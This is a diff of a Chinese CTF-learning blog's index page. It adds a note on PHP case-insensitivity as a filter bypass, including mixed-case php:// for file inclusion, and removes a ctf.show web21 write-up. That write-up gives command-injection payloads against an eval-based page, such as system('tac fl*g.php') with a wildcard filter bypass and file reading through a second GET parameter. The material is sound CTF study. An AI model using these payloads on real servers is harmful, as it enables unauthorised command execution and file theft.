@@ -73,6 +73,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-大小写绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-04-15T10:44:35.803Z" itemprop="datePublished">2025-04-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/">大小写绕过</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>PHP 中有许多不用考虑大小写的地方，如：</p>
+<ul>
+<li><p><strong>PHP 标签</strong><code>&lt;?php</code><br>一般情况下必须严格小写，但某些服务器配置<strong>可能支持</strong>大写如 <code>&lt;?Php</code> 这样的写法。目前做的做题能用。</p>
+</li>
+<li><p><strong>伪协议名称</strong><br><code>php://</code>、<code>data://</code>等伪协议名称可以大小写混用，但目前做的题只有<code>php://</code>不用考虑大小写，<code>data://</code>大小写混用或是全大写就无法正常文件包含。所以现在大小写混用**只考虑<code>php://</code>**。</p>
+</li>
+<li><p><strong>关键字和控制结构</strong><br>如 <code>if</code>、<code>else</code>、<code>while</code>、<code>for</code>、<code>echo</code>、<code>return</code> 等。例如，<code>IF (...) &#123;...&#125;</code> 或 <code>ECHO &quot;Hello&quot;;</code> 是合法的。</p>
+</li>
+<li><p><strong>函数名（用户定义和内置）</strong><br>用户定义的函数和PHP内置函数在调用时不区分大小写。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="title function_ invoke__">myfunc</span>(); <span class="comment">// 可调用</span></span><br><span class="line"><span class="title function_ invoke__">STRTOLOWER</span>(<span class="string">&quot;ABC&quot;</span>); <span class="comment">// 等同于 strtolower()</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>类名和方法名</strong><br>用户定义的类名和方法名在引用时不区分大小写。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MYCLASS</span>(); <span class="comment">// 可实例化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myMethod</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">MYMETHOD</span>(); <span class="comment">// 可调用</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>常量（通过 <code>define</code> 定义且启用大小写不敏感时）</strong><br>使用 <code>define(&quot;NAME&quot;, value, true)</code> 定义的常量，第三个参数为 <code>true</code> 时大小写不敏感。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;GREETING&quot;</span>, <span class="string">&quot;Hello&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> greeting; <span class="comment">// 输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>对大小写敏感的部分</strong>：</p>
+<ul>
+<li>变量名（如 <code>$var</code> 和 <code>$VAR</code> 不同）。</li>
+<li>属性名和常量（默认情况下）。</li>
+<li>魔术常量（如 <code>__FILE__</code>、<code>__LINE__</code>）和魔术方法（如 <code>__construct()</code>，需严格拼写）。</li>
+<li>预定义变量（如 <code>$_GET</code>、<code>$_POST</code>）。</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" data-id="cm9igwndu001gncuheru5g8c1" data-title="大小写绕过" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-一些辨析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/" class="article-date">
@@ -116,7 +184,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/" data-id="cm9idrqhr000cvcuhgzno7v6n" data-title="一些辨析" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/" data-id="cm9igwndr0011ncuhd1k51l7t" data-title="一些辨析" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -227,7 +295,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%9A%E5%B1%82%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" data-id="cm9idrqi4001gvcuhc549ceen" data-title="多层函数绕过过滤" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%9A%E5%B1%82%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" data-id="cm9igwndt001bncuh3gihhxay" data-title="多层函数绕过过滤" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -384,7 +452,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/data%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9idrqhq0008vcuh94yi81g2" data-title="data:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/data%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9igwndn0008ncuhamhu46md" data-title="data:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -543,7 +611,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9idrqi70020vcuh0k2u6ydx" data-title="文件包含与 php:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9igwndx0027ncuhfv0hhznm" data-title="文件包含与 php:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -588,7 +656,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" data-id="cm9idrqi3001cvcuh4jm9at7h" data-title="关于服务器的知识（持续增加）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" data-id="cm9igwnds0016ncuh9a7z33qj" data-title="关于服务器的知识（持续增加）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -648,7 +716,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E2%80%9C%E7%A9%BA%E7%99%BD%E2%80%9D%E7%BD%91%E9%A1%B5%E6%97%A0%20JavaScript%20%E4%BB%A3%E7%A0%81%E5%8D%B4%E6%9C%89%E5%BC%B9%E7%AA%97%E7%9A%84%E9%97%AE%E9%A2%98/" data-id="cm9idrqhw001bvcuhgnhoh3ni" data-title="关于“空白”网页无 JavaScript 代码却有弹窗的问题" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E2%80%9C%E7%A9%BA%E7%99%BD%E2%80%9D%E7%BD%91%E9%A1%B5%E6%97%A0%20JavaScript%20%E4%BB%A3%E7%A0%81%E5%8D%B4%E6%9C%89%E5%BC%B9%E7%AA%97%E7%9A%84%E9%97%AE%E9%A2%98/" data-id="cm9igwnds0012ncuh04uhcsu0" data-title="关于“空白”网页无 JavaScript 代码却有弹窗的问题" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -799,7 +867,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/URL%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="cm9idrqhp0006vcuhdz9e45g2" data-title="URL 知识点" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/URL%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="cm9igwndm0006ncuh804ihfnh" data-title="URL 知识点" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -843,7 +911,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/Cookie%E2%98%86/" data-id="cm9idrqhn0003vcuh5sip4sjv" data-title="Cookie☆" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/Cookie%E2%98%86/" data-id="cm9igwndg0001ncuh0nwp3r8j" data-title="Cookie☆" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -894,89 +962,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E6%B3%A8%E9%87%8A/" data-id="cm9idrqi4001evcuhawb79x0w" data-title="关于注释" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E6%B3%A8%E9%87%8A/" data-id="cm9igwnds0014ncuhf9u77qwu" data-title="关于注释" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-我的第一道命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/13/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E9%81%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
-  <time class="dt-published" datetime="2025-04-13T14:10:25.147Z" itemprop="datePublished">2025-04-13</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/13/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E9%81%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">我的第一道命令执行</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>题目： ctf.show web21</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正则表达式会匹配 <code>flag</code> ，忽略大小写。如果 GET 请求的参数 <code>c</code> 中含有 <code>flag</code> ，便无法利用 <code>eval</code> 执行命令。</p>
-<p>对此，先用 <code>ls</code> 命令看看目录里有什么：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(ls);</span><br></pre></td></tr></table></figure>
-
-<p><strong>tips</strong></p>
-<ul>
-<li><p><code>system()</code> 函数：可执行操作系统命令，实时输出结果到浏览器&#x2F;终端。</p>
-</li>
-<li><p>此处 <code>ls</code> 命令无空格，所以可以不加引号，但依旧建议使用 <code>system()</code> 函数时给命令加上引号。</p>
-</li>
-<li><p>我的浏览器会自动 URL 转码，所以此处没转码。</p>
-</li>
-</ul>
-<p>目录中有两个文件： <code>index.php</code> 和 <code>flag.php</code> ，此时可以通过多种方式得到 <code>flag.php</code> 的内容：</p>
-<p><strong>方法一：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;cat fl*g.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>通过通配符 <code>*</code> 绕过正则表达式，直接查看文件内容。但文件开头有个 <code>&lt;?php</code> ，其中 <code>&lt;</code> 会导致 HTML 解析异常，文件内容不会直接显示在网页中，要查看源码才能看到。</p>
-<p>对此，作出如下改进：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;tac fl*g.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p> <code>tac</code> 命令从末行开始输出，最后输出首行，虽然 <code>&lt;?php</code> 无法正常在网页中显示，但其他行全部正常显示。</p>
-<p><strong>方法二：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;cp fl*g.php a.txt&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>通过 <code>cp</code> 命令复制一个新的文件 <code>a.txt</code> ，然后尝试通过 URL 访问该文件，成功。</p>
-<p><strong>方法三：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo file_get_contents($_GET[a]);&amp;a=flag.php</span><br></pre></td></tr></table></figure>
-
-<p>代码只过滤了 GET 请求的参数 <code>c</code> ，未过滤其它参数，所以此处设定参数 <code>a</code> 为 <code>flag.php</code> 然后再读取 <code>$_GET[a]</code> 能够绕过过滤。不过，同方法一的问题，文件内容在源码里，要开 F12 。</p>
-<p><strong>提醒一下自己，URL 传参没必要给每个参数的值加引号。</strong></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/13/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E9%81%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cm9idrqi6001pvcuhcp2x46l0" data-title="我的第一道命令执行" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
 
     </footer>
   </div>
@@ -1021,7 +1011,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 20px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 13.33px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 16.67px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 13.33px;">爆破</a>
+      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 17.5px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 12.5px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 15px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 12.5px;">爆破</a>
     </div>
   </div>
 
@@ -1043,6 +1033,10 @@
       <ul>
         
           <li>
+            <a href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/">大小写绕过</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/">一些辨析</a>
           </li>
         
@@ -1056,10 +1050,6 @@
         
           <li>
             <a href="/2025/04/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含与 php:// 伪协议</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/14/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/">关于服务器的知识（持续增加）</a>
           </li>
         
       </ul>
